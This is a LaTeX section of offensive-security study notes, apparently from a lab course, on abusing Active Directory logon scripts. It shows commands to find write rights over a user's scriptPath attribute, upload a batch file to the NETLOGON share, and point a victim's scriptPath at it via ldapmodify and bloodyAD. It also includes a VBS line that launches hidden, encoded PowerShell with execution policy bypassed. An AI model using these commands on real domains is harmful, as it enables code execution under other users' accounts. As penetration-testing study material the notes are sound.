\section{Logon Scripts}

Two methods for assigning users a logon script: 
\begin{itemize}
    \item 
        \href{https://learn.microsoft.com/en-us/windows/win32/adschema/a-scriptpath}{scriptPath} attribute of an account. supports batch (*.bat) or command (*.cmd) files, executable programs (*.exe), or programs written in any language hosted by the \href{https://www.rlmueller.net/LogonScriptFAQ.htm#What%20languages%20can%20I%20use%20for%20logon%20scripts}{Windows Script Host automation technology}. scriptPath does not support PowerShell. These script are stored in \verb+SYSVOL+. the \verb+NETLOGON+ network share holds all the logon scripts that reside in the \verb+%systemroot%\SYSVOL\sysvol\<DOMAIN_DNS_NAME>\scripts\+
    \item 
        Group Policy: \verb+User Configuration / Windows Settings / Scripts (Logon/Logoff) / Logon+. It support PowerShell
\end{itemize}

\subsection{From Linux}
Using \href{https://github.com/the-useless-one/pywerview}{PywerView} with \verb+get-objectacl --resolve-sids --resolve-guids+

using json filter:
\begin{verbatim}
| jq '.results | map(select(.securityidentifier | contains("david")))'
\end{verbatim}


using \href{https://github.com/fortra/impacket/pull/1291}{dacledit}

WriteProperty over the Object type (GUID) field with the value bf9679a8-0de6-11d0-a285-00aa003049e2, which belongs to \href{https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-ada3/c640630e-23ff-44e7-886f-16df9574039e}{scriptPath}; 


\begin{verbatim}
CreateObject("Wscript.shell").Run "powershell -ExecutionPolicy Bypass \
    -WindowStyle Hidden -EncodedCommand JABMAEgATw<SNIP>"

smbclient //10.129.229.224/NETLOGON --directory EricsScripts \
    -U David%'SecurePassDav!d5' -c "put logonScript.bat"

\end{verbatim}

\begin{verbatim}
ldapmodify -H ldap://10.129.229.224 -x -D 'david@inlanefreight.local' \
-w 'SecurePassDav!d5' -f logonScript.ldif
\end{verbatim}

with \verb+logonScript.ldif+:
\begin{verbatim}
dn: CN=eric,CN=Users,DC=inlanefreight,DC=local
changetype: modify
replace: scriptPath
scriptPath: EricsScripts\logonScript.bat
\end{verbatim}


\href{https://github.com/CravateRouge/bloodyAD}{bloodyAD} is an AD privilege escalation command-line utility that allows us to set and get values of objects' attributes in addition to many other operations.

\begin{verbatim}
bloodyAD --host "10.129.229.224" -d "inlanefreight.local" \
    -u "david" -p 'SecurePassDav!d5'\
    set object eric scriptPath -v 'EricsScripts\logonScript.bat'
\end{verbatim}

\subsection{From Windows}

\href{https://github.com/techspence/ScriptSentry}{ScriptSentry}
